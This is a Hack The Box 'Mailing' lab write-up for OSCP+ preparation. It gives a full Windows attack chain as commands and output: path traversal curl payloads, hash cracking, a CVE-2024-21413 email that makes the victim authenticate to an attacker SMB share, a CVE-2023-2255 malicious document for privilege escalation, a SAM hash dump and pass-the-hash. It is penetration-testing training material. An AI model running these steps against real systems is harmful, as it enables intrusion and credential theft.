---
layout: post
title:  HTB Mailing Write-up
description: Part of the OSCP+ Preparation Series
date:   2024-11-18 03:00:00 +0300
image:  '/images/htb_mailing.png'
tags:   [Write-ups, HTB, OSCP+, Easy, Windows, Path-Traversal, CVE, Capturing-NTLMv2-Hashes, WinRM, Credential-Dumping, Pass-the-Hash]
---

# Table of Contents
- [Enumeration](#enumeration)
  - [Nmap](#nmap)
  - [Web Enumeration](#web-enumeration)
  - [Abusing Path Traversal vulnerability to get credentials](#abusing-path-traversal-vulnerability-to-get-credentials)
- [Foothold](#foothold)
  - [CVE-2024-21413 to capture hash of maya using a SMB server](#cve-2024-21413-to-capture-hash-of-maya-using-a-smb-server)
  - [Access as the user maya using Evil-WinRM](#access-as-the-user-maya-using-evil-winrm)
- [Privilege Escalation](#privilege-escalation)
  - [CVE-2023-2255 to add the user maya to local administrators group Administradores](#cve-2023-2255-to-add-the-user-maya-to-local-administrators-group-administradores)
  - [Dumping hashes using NetExec and Pass-the-Hash with Evil-WinRM to get access as localadmin](#dumping-hashes-using-netexec-and-pass-the-hash-with-evil-winrm-to-get-access-as-localadmin)

# Enumeration
### Nmap

```shell
# Step 1 - Find active ports
nmap -p- -Pn --min-rate 10000 10.129.134.249

# Step 2 - Focus scan on the active ports found
nmap -A -T4 -Pn -p25,80,110,135,139,143,445,465,587,993,5040,47001 10.129.134.249
```

```shell
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-17 13:49 EST
Nmap scan report for 10.129.134.249
Host is up (0.036s latency).

PORT      STATE SERVICE       VERSION
25/tcp    open  smtp          hMailServer smtpd
| smtp-commands: mailing.htb, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: Did not follow redirect to http://mailing.htb
|_http-server-header: Microsoft-IIS/10.0
110/tcp   open  pop3          hMailServer pop3d
|_pop3-capabilities: UIDL USER TOP
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
143/tcp   open  imap          hMailServer imapd
|_imap-capabilities: CHILDREN NAMESPACE completed QUOTA OK CAPABILITY IMAP4 IMAP4rev1 IDLE SORT RIGHTS=texkA0001 ACL
445/tcp   open  microsoft-ds?
465/tcp   open  ssl/smtp      hMailServer smtpd
| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
| Not valid before: 2024-02-27T18:24:10
|_Not valid after:  2029-10-06T18:24:10
|_ssl-date: TLS randomness does not represent time
| smtp-commands: mailing.htb, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
587/tcp   open  smtp          hMailServer smtpd
| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
| Not valid before: 2024-02-27T18:24:10
|_Not valid after:  2029-10-06T18:24:10
| smtp-commands: mailing.htb, SIZE 20480000, STARTTLS, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
|_ssl-date: TLS randomness does not represent time
993/tcp   open  ssl/imap      hMailServer imapd
| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
| Not valid before: 2024-02-27T18:24:10
|_Not valid after:  2029-10-06T18:24:10
|_ssl-date: TLS randomness does not represent time
5040/tcp  open  unknown
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: mailing.htb; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-11-17T18:51:48
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 206.84 seconds
```

We can see the domain mailing.htb on the nmap results. Lets add it to /etc/hosts:

```shell
echo "10.129.134.249 mailing.htb" | sudo tee -a /etc/hosts
```

### Web Enumeration
Lets visit the website:

```shell
http://mailing.htb
```

If we scroll down, we will see a Download Instructions button we can click. If we inspect the link, we will see the following:

```shell
http://mailing.htb/download.php?file=instructions.pdf
```

The application seems to read the value of the file parameter in the URL and includes the file on the server. This means that if the application doesnt sanitize the input in the download parameter, we could abuse this creating a malicious request to exfiltrate and read information from the target.

### Abusing Path Traversal vulnerability to get credentials
Lets try to craft a request payload to read files and get information. Notice that we are attacking a Windows machine and we will need to craft a payload for a Windows machine.

We can capture the request and edit it on Burp Suite or use the curl command.

I will use curl with the following command:

```shell
curl -X 'GET' 'http://mailing.htb/download.php?file=..\..\Windows\System32\drivers\etc\hosts'
```

If we examine the response, we will notice that we were able to read the contents of \etc\hosts on the Windows target successfully:

```shell
# Copyright (c) 1993-2009 Microsoft Corp.
#
# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
#
# This file contains the mappings of IP addresses to host names. Each
# entry should be kept on an individual line. The IP address should
# be placed in the first column followed by the corresponding host name.
# The IP address and the host name should be separated by at least one
# space.
#
# Additionally, comments (such as these) may be inserted on individual
# lines or following the machine name denoted by a '#' symbol.
#
# For example:
#
#      102.54.94.97     rhino.acme.com          # source server
#       38.25.63.10     x.acme.com              # x client host

# localhost name resolution is handled within DNS itself.
#       127.0.0.1       localhost
#       ::1             localhost

127.0.0.1       mailing.htb
```

Lets change the payload and try to get more information:

```shell
curl -X 'GET' 'http://mailing.htb/download.php?file=..\..\..\Program+Files+(x86)\hMailServer\Bin\hMailServer.ini'
```

```shell
[Directories]
ProgramFolder=C:\Program Files (x86)\hMailServer
DatabaseFolder=C:\Program Files (x86)\hMailServer\Database
DataFolder=C:\Program Files (x86)\hMailServer\Data
LogFolder=C:\Program Files (x86)\hMailServer\Logs
TempFolder=C:\Program Files (x86)\hMailServer\Temp
EventFolder=C:\Program Files (x86)\hMailServer\Events
[GUILanguages]
ValidLanguages=english,swedish
[Security]
AdministratorPassword=841bb5acfa6779ae432fd7a4e6600ba7
[Database]
Type=MSSQLCE
Username=
Password=0a9f8ad8bf896b501dde74f08efd7e4c
PasswordEncryption=1
Port=0
Server=
Database=hMailServer
Internal=1
```

Nice! We were able to read the contents of the file hMailServer.ini and we also found the hash of the Administrator password it seems:

```shell
841bb5acfa6779ae432fd7a4e6600ba7
```

We can crack the hash using crackstation.net or using the following commands:

```shell
# Copy the hash into a text file and name it administrator_hash.txt
echo '841bb5acfa6779ae432fd7a4e6600ba7' > administrator_hash.txt

# Check the type of hash (We got many possibilities, but since it looks like MD5, lets suppose its MD5)
hashid administrator_hash.txt

# Use hashcat to crack it with -m 0 for MD5 and use rockyou.txt as wordlist
hashcat -m 0 administrator_hash.txt /usr/share/wordlists/rockyou.txt
```

We managed to succesfully crack the hash and get the following password:

```shell
homenetworkingadministrator
```

# Foothold

### CVE-2024-21413 to capture hash of maya using a SMB server
The remote Windows server is running a mail server and probably using a client to connect to it. We will suppose that its using the default client for Windows, which is called Windows Mail.

Knowing this, we will use google to try to find a recent vulnerability related to Windows Mail.

This led us to the following PoC:

https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability

Lets get the exploit and start our attack:

```shell
git clone https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability.git
cd CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability
```

Start a SMB server to be able to capture the hashes:

```shell
impacket-smbserver kalishare . -smb2support
```

Now we need possible valid email addresses.

On the website we found these names: Ruy Alonso, Maya Bendito, Gregory Smith.

We can try multiple format combinations, creating the following list:

```shell
ruy@mailing.htb
maya@mailing.htb
gregory@mailing.htb
ruyalonso@mailing.htb
mayabendito@mailing.htb
gregorysmith@mailing.htb
ralonso@mailing.htb
mbendito@mailing.htb
gsmith@mailing.htb
ruy.alonso@mailing.htb
maya.bendito@mailing.htb
gregory.smith@mailing.htb
r.alonso@mailing.htb
m.bendito@mailing.htb
g.smith@mailing.htb
```

After doing some tests, we will use maya@mailing.htb:

```shell
python3 CVE-2024-21413.py --server mailing.htb --port 587 --username administrator@mailing.htb --password 'homenetworkingadministrator' --sender administrator@mailing.htb --recipient maya@mailing.htb --url "\\10.10.14.206\kalishare\test.txt" --subject Test
```

We will need to wait some time after sending the email to get a reply on our SMB server:

```shell
[*] User MAILING\maya authenticated successfully
[*] maya::MAILING:aaaaaaaaaaaaaaaa:4e87a3edc544aec3b90a17143c28c829:010100000000000000d0e1a12739db0102b0eea94576d407000000000100100075006100740068004e0041004b0063000300100075006100740068004e0041004b006300020010006300460046007700450079005400730004001000630046004600770045007900540073000700080000d0e1a12739db010600040002000000080030003000000000000000000000000020000052a9e57606de311007373c22787d82fad43e53bdd85c31fbd8ef8c245c7769390a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310034002e003200300036000000000000000000
```

Note: Restart the machine if we dont get any response, it shouldnt take longer than 1 minute to get a response.

Now we can try to crack the hash:

```shell
# Copy the hash inside a text file and save it as maya_hash.txt
sudo gedit maya_hash.txt

# Use hashcat to crack it
hashcat -m 5600 maya_hash.txt /usr/share/wordlists/rockyou.txt
```

We were able to crack the hash successfully using hashcat:

```shell
# Password of maya
m4y4ngs4ri
```

### Access as the user maya using Evil-WinRM

Now we can use the credentials we got to get WinRM as maya:

```shell
evil-winrm -i http://10.129.134.249 -u maya -p 'm4y4ngs4ri'
```

```shell
*Evil-WinRM* PS C:\Users\maya\Documents> whoami
mailing\maya
```

### User Flag
Now we can get the user.txt flag:

```shell
type C:\Users\maya\Desktop\user.txt
```

# Privilege Escalation
### CVE-2023-2255 to add the user maya to local administrators group Administradores
Enumerating the files in the system, we found LibreOffice installed using the version 7.4:

```shell
type "C:\Program Files\LibreOffice\readmes\readme_es.txt"
```

Inside this readme file in spanish, we found information telling us about the version:

```shell
======================================================================

LÃ©ame de LibreOffice 7.4

======================================================================
```

Searching for an exploit using Google, we found the following:

https://github.com/elweth-sec/CVE-2023-2255

If we read the exploit documentation, we will see the following usage:

```shell
python3 CVE-2023-2255.py --cmd 'wget https://raw.githubusercontent.com/elweth-sec/CVE-2023-2255/main/webshell.php' --output 'exploit.odt'
```

Now we need to find a directory where the user might be accessing files. Enumerating the directories I found the suspicious C:\Important Documents folder.

Knowing this, we can change the command to create an exploit file to add the user maya to the local admins group:

```shell
git clone https://github.com/elweth-sec/CVE-2023-2255.git
cd CVE-2023-2255

python3 CVE-2023-2255.py --cmd 'net localgroup Administradores maya /add"' --output 'exploit.odt'
```

Now we need to find a directory where the user might be accessing files. Enumerating the directories I found the suspicious C:\Important Documents folder.

After that, we will move nc.exe and the exploit.odt file using evil-winrm upload function and then run it:

```shell
# Upload the exploit
cd "C:\Important Documents"
upload exploit.odt

# Start nc listener
nc -lvnp 8080

# Using the exploit
./exploit.odt
```

Wait for the exploit to have get run.

Then check if the user maya was successfully added to Administradores:

```shell
net user maya
```

```shell
User name                    maya
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            2024-04-12 3:16:20 AM
Password expires             Never
Password changeable          2024-04-12 3:16:20 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   2024-11-18 4:26:57 AM

Logon hours allowed          All

Local Group Memberships      *Administradores      *Remote Management Use
                             *Usuarios             *Usuarios de escritori
Global Group memberships     *Ninguno
The command completed successfully.
```

It worked!

### Dumping hashes using NetExec and Pass-the-Hash with Evil-WinRM to get access as localadmin
Now we can use the user maya to dump all hashes using NetExec:

```shell
netexec smb 10.129.134.249 -u maya -p "m4y4ngs4ri" --sam
```

```shell
SMB         10.129.134.249  445    MAILING          [*] Windows 10 / Server 2019 Build 19041 x64 (name:MAILING) (domain:MAILING) (signing:False) (SMBv1:False)                                                                                                                              
SMB         10.129.134.249  445    MAILING          [+] MAILING\maya:m4y4ngs4ri (Pwn3d!)
SMB         10.129.134.249  445    MAILING          [*] Dumping SAM hashes
SMB         10.129.134.249  445    MAILING          Administrador:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.129.134.249  445    MAILING          Invitado:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.129.134.249  445    MAILING          DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.129.134.249  445    MAILING          WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:e349e2966c623fcb0a254e866a9a7e4c:::                                                                                                                                             
SMB         10.129.134.249  445    MAILING          localadmin:1001:aad3b435b51404eeaad3b435b51404ee:9aa582783780d1546d62f2d102daefae:::
SMB         10.129.134.249  445    MAILING          maya:1002:aad3b435b51404eeaad3b435b51404ee:af760798079bf7a3d80253126d3d28af:::
SMB         10.129.134.249  445    MAILING          [+] Added 6 SAM hashes to the database
```

After dumping the hashes, we can use the localadmin hash to Pass-the-Hash with Evil-WinRM and get access as localadmin:

```shell
evil-winrm -i 10.129.134.249 -u localadmin -H 9aa582783780d1546d62f2d102daefae
```

### Root Flag
Now we can get the root.txt flag:

```shell
type C:\Users\localadmin\Desktop\root.txt
```

